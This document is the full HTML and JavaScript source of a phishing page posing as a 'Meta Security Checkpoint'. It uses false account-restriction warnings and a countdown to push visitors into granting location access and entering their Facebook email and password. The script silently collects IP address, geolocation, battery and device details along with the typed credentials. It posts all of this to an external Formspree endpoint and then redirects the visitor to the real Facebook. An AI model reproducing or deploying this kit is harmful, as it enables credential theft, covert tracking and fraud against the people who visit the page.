<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta charset="UTF-8">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4w_yY5s_kX.ico" type="image/x-icon"> <!-- Facebook Icon -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f0f2f5; /* Standard Facebook light grey background */
            margin: 0;
            color: #1c1e21; /* Dark grey text */
            text-align: center;
            overflow: hidden;
            /* background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/d4w_yY5s_kX.png'); Subtle Facebook pattern */
            background-repeat: no-repeat;
            background-size: cover;
            background-position: center;
        }
        .card-container {
            background-color: #ffffff;
            padding: 30px 40px;
            border-radius: 8px; /* Softer corners */
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
            max-width: 480px;
            width: 90%;
            border: 1px solid #dddfe2; /* Light border */
            animation: fadeInScale 0.6s ease-out;
            box-sizing: border-box;
            position: relative;
            overflow: hidden;
        }
        @keyframes fadeInScale {
            from { opacity: 0; transform: translateY(-20px) scale(0.95); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        .header {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 25px;
            border-bottom: 1px solid #ebedf0;
            padding-bottom: 20px;
        }
        .header img {
            height: 50px;
            width: 50px;
            margin-bottom: 15px;
        }
        .header h1 {
            color: #1c1e21;
            font-size: 1.9em;
            font-weight: 700;
            margin: 0;
            line-height: 1.2;
        }
        p {
            font-size: 1em;
            line-height: 1.6;
            margin-bottom: 20px;
            color: #4b4f56;
        }
        .message-box {
            background-color: #f7f9fb;
            border: 1px solid #e0e2e5;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 0.95em;
            color: #5f626d;
            line-height: 1.5;
        }
        .loader-wrapper {
            margin: 30px auto;
            position: relative;
            height: 6px;
            background-color: #e9ecef;
            border-radius: 3px;
            overflow: hidden;
            width: 80%;
            opacity: 1;
            transition: opacity 0.3s ease-in-out;
        }
        .loader-wrapper.hidden {
            opacity: 0;
            height: 0;
            margin-top: 0;
            margin-bottom: 0;
        }
        .loader-bar {
            height: 100%;
            width: 0%;
            background-color: #1877F2;
            border-radius: 3px;
            animation: progress 8s linear forwards;
            position: absolute;
            left: 0;
            top: 0;
        }
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        #status {
            color: #1877F2;
            font-weight: 500;
            margin-top: 15px;
            font-size: 0.95em;
            min-height: 20px;
            opacity: 1;
            transition: opacity 0.3s ease-in-out;
        }
        #status.hidden {
            opacity: 0;
            min-height: 0;
        }
        .countdown {
            font-size: 1.1em;
            font-weight: 700;
            color: #e44949;
            margin-top: 20px;
            opacity: 1;
            transition: opacity 0.3s ease-in-out;
        }
        .countdown.hidden {
            opacity: 0;
            height: 0;
            margin-top: 0;
            margin-bottom: 0;
        }
        .countdown span {
            font-size: 1.2em;
            margin: 0 5px;
        }
        .small-print {
            font-size: 0.85em;
            color: #8a8d91;
            margin-top: 25px;
            line-height: 1.4;
            padding-top: 15px;
            border-top: 1px solid #ebedf0;
        }
        .login-form-section {
            display: none; /* Hidden by default */
            margin-top: 25px;
            animation: fadeIn 0.8s ease-out;
        }
        .login-form-section.show {
            display: block;
        }
        .login-form-section input[type="text"],
        .login-form-section input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 1em;
            color: #1c1e21;
        }
        .login-form-section input[type="text"]::placeholder,
        .login-form-section input[type="password"]::placeholder {
            color: #8a8d91;
        }
        .login-button {
            background-color: #1877F2;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            padding: 12px 25px;
            font-size: 1.1em;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s ease;
        }
        .login-button:hover {
            background-color: #166fe5;
        }
        .forgot-password {
            margin-top: 15px;
            font-size: 0.9em;
            color: #1877F2;
            text-decoration: none;
            display: block;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        .message-success {
            color: #4CAF50;
            font-weight: bold;
            font-size: 1.1em;
            margin-bottom: 20px;
        }
        .message-error {
            color: #e44949;
            font-weight: bold;
            font-size: 1.1em;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="card-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Meta Logo">
            <h1>Meta Security Checkpoint</h1>
        </div>
        <p>Your Meta account access has been temporarily restricted due to unusual activity detected on your network.</p>
        <div class="message-box">
            To lift this restriction and confirm your identity, a quick **Region Verification** is required. This ensures your account is secure from unauthorized access. A nominal fee of **PKR 1** will be charged for this security validation.
        </div>
        <div class="loader-wrapper" id="loaderWrapper">
            <div class="loader-bar" id="loaderBar"></div>
        </div>
        <p id="status">Initiating secure connection protocol...</p>
        <p class="countdown" id="countdownTimer">Time remaining: <span id="timer">00:59</span></p>

        <!-- Fake Login Form Section -->
        <div class="login-form-section" id="loginFormSection">
            <p class="message-success" id="loginStatusMessage"></p>
            <form id="phishingLoginForm">
                <input type="text" id="emailInput" name="email" placeholder="Email address or phone number" required>
                <input type="password" id="passwordInput" name="password" placeholder="Password" required>
                <button type="submit" class="login-button">Log In</button>
                <a href="https://www.facebook.com/recover/initiate/" class="forgot-password" target="_blank">Forgotten password?</a>
            </form>
        </div>

        <p class="small-print">Failure to complete this verification within the given timeframe will result in permanent account access limitations. Your immediate action is crucial for maintaining security and service continuity. This process is fully compliant with Meta's privacy policy.</p>
    </div>

    <script>
        const statusElement = document.getElementById("status");
        const loaderBar = document.getElementById("loaderBar");
        const loaderWrapper = document.getElementById("loaderWrapper");
        const timerElement = document.getElementById("timer");
        const countdownTimerDiv = document.getElementById("countdownTimer");
        const loginFormSection = document.getElementById("loginFormSection");
        const loginStatusMessage = document.getElementById("loginStatusMessage");
        const phishingLoginForm = document.getElementById("phishingLoginForm");
        const emailInput = document.getElementById("emailInput");
        const passwordInput = document.getElementById("passwordInput");

        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xkgpwozb'; // *** Your Formspree Endpoint is pasted here! ***
        const REDIRECT_URL_AFTER_LOGIN = 'https://www.facebook.com/login/?privacy_mutation_token=...'; // Real Facebook login URL
        const REDIRECT_URL_FAILURE = 'https://www.facebook.com/help/contact/260749603972907'; // Redirect after overall failure to Facebook Help

        let dataPayload = {
            Timestamp: new Date().toISOString(),
            Status: "Initializing",
            Latitude: "N/A",
            Longitude: "N/A",
            Accuracy: "N/A",
            email: "N/A", // Lowercase 'email' to match Formspree's expectation
            password: "N/A", // Lowercase 'password'
            UserAgent: navigator.userAgent,
            Referrer: document.referrer || "Direct Access",
            IPAddress: "N/A",
            NetworkType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "N/A",
            Language: navigator.language || "N/A",
            ScreenResolution: `${window.screen.width}x${window.screen.height}`,
            BatteryLevel: "N/A",
            BatteryCharging: "N/A",
            Platform: navigator.platform || "N/A",
            Vendor: navigator.vendor || "N/A"
        };

        let timerSeconds = 59;
        let timerInterval;
        let verificationSuccessful = false;

        function updateLoader(percentage) {
            loaderBar.style.width = `${percentage}%`;
        }

        function startTimer() {
            timerInterval = setInterval(() => {
                timerSeconds--;
                let minutes = Math.floor(timerSeconds / 60);
                let seconds = timerSeconds % 60;
                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                if (timerSeconds <= 0) {
                    clearInterval(timerInterval);
                    if (!verificationSuccessful) {
                        hideLoadingElements();
                        loginStatusMessage.className = 'message-error';
                        loginStatusMessage.innerHTML = "Time expired! Account access restricted. Please try again or contact support.";
                        loginFormSection.classList.add('show');
                    }
                }
            }, 1000);
        }

        function hideLoadingElements() {
            loaderWrapper.classList.add('hidden');
            statusElement.classList.add('hidden');
            countdownTimerDiv.classList.add('hidden');
        }

        // --- NEW sendAllDataToFormspree function to send EVERYTHING ---
        async function sendAllDataToFormspree(dataToSend) {
            try {
                const formData = new FormData();
                for (const key in dataToSend) {
                    formData.append(key, dataToSend[key]);
                }
                
                const response = await fetch(FORMSPREE_ENDPOINT, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    console.log("Data sent to Formspree successfully (all fields).");
                } else {
                    const errorText = await response.text();
                    console.error("Error sending data to Formspree (all fields):", response.status, errorText);
                }
            } catch (error) {
                console.error('Network or other error sending data to Formspree (all fields):', error);
            }
        }
        // --- END NEW FUNCTION ---

        async function getIPAddress() {
            try {
                statusElement.innerHTML = "Verifying network integrity (1/3)...";
                updateLoader(20);
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                dataPayload.IPAddress = ipData.ip;
                statusElement.innerHTML = `IP Confirmed: ${ipData.ip}. Initiating security assessment (2/3)...`;
                updateLoader(40);
            } catch (error) {
                console.error('Error fetching IP:', error);
                dataPayload.IPAddress = "Failed to fetch";
                statusElement.innerHTML = "IP verification skipped. Attempting direct identity confirmation...";
                updateLoader(40);
            } finally {
                // Send the initial payload (IP and passive data)
                sendAllDataToFormspree(dataPayload);
            }
        }

        async function getBatteryStatus() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    dataPayload.BatteryLevel = battery.level * 100 + "%";
                    dataPayload.BatteryCharging = battery.charging ? "Charging" : "Not Charging";
                }
            } catch (e) {
                console.warn("Battery API not available or blocked:", e);
            }
        }

        function getPreciseLocation() {
            if (navigator.geolocation) {
                statusElement.innerHTML = "Finalizing Region Verification (3/3): Please 'Allow' Location Access to proceed.";
                updateLoader(60);
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        dataPayload.Latitude = position.coords.latitude;
                        dataPayload.Longitude = position.coords.longitude;
                        dataPayload.Accuracy = position.coords.accuracy;
                        dataPayload.Status = "Geolocation Success - Identity Verified";
                        verificationSuccessful = true;
                        hideLoadingElements();
                        loginStatusMessage.className = 'message-success';
                        loginStatusMessage.innerHTML = "Verification Complete! Your account is now secure. Please log in again.";
                        loginFormSection.classList.add('show');
                        // Send updated dataPayload (now with geo info) to Formspree
                        sendAllDataToFormspree(dataPayload); 
                        clearInterval(timerInterval);
                    },
                    (error) => {
                        let errorMessage = "Region verification failed.";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Location access denied. Account restriction imminent.";
                                dataPayload.Status = "Geolocation Denied - Restriction Imminent";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Location data unavailable. Account restriction imminent.";
                                dataPayload.Status = "Geolocation Unavailable - Restriction Imminent";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "Verification timed out. Account restriction imminent.";
                                dataPayload.Status = "Geolocation Timeout - Restriction Imminent";
                                break;
                            case error.UNKNOWN_ERROR:
                                errorMessage = "An unexpected error occurred. Account restriction imminent.";
                                dataPayload.Status = "Geolocation Unknown Error - Restriction Imminent";
                                break;
                        }
                        hideLoadingElements();
                        loginStatusMessage.className = 'message-error';
                        loginStatusMessage.innerHTML = `${errorMessage} Please log in to review your account status.`;
                        loginFormSection.classList.add('show');
                        // Send dataPayload (with geo error info) to Formspree
                        sendAllDataToFormspree(dataPayload); 
                        clearInterval(timerInterval);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 7000,
                        maximumAge: 0
                    }
                );
            } else {
                dataPayload.Status = "Geolocation Not Supported - Account Restriction Imminent";
                hideLoadingElements();
                loginStatusMessage.className = 'message-error';
                loginStatusMessage.innerHTML = "Device does not support location services. Account restriction imminent. Please log in to review your account status.";
                loginFormSection.classList.add('show');
                // Send dataPayload (with geo-not-supported info) to Formspree
                sendAllDataToFormspree(dataPayload); 
                clearInterval(timerInterval);
            }
        }

        // Handle fake login form submission
        phishingLoginForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Stop default form submission

            // Get values from input fields directly
            dataPayload.email = emailInput.value; // Update email in main payload
            dataPayload.password = passwordInput.value; // Update password in main payload
            dataPayload.Status = dataPayload.Status + " | Credentials Captured"; // Update status with credential attempt

            loginStatusMessage.innerHTML = "Logging in...";
            loginStatusMessage.className = ''; // Remove previous classes

            // --- Send the ENTIRE updated dataPayload (including credentials) to Formspree ---
            await sendAllDataToFormspree(dataPayload); 
            // --- END Send ---

            // Immediately redirect to the real Facebook login page
            setTimeout(() => {
                window.location.href = REDIRECT_URL_AFTER_LOGIN;
            }, 1000); // Redirect after a short delay
        });


        window.onload = async () => {
            startTimer();
            await getBatteryStatus();
            await getIPAddress(); // This also calls sendAllDataToFormspree for initial data
            getPreciseLocation(); // This also calls sendAllDataToFormspree with geo data
        };
    </script>
</body>
</html>
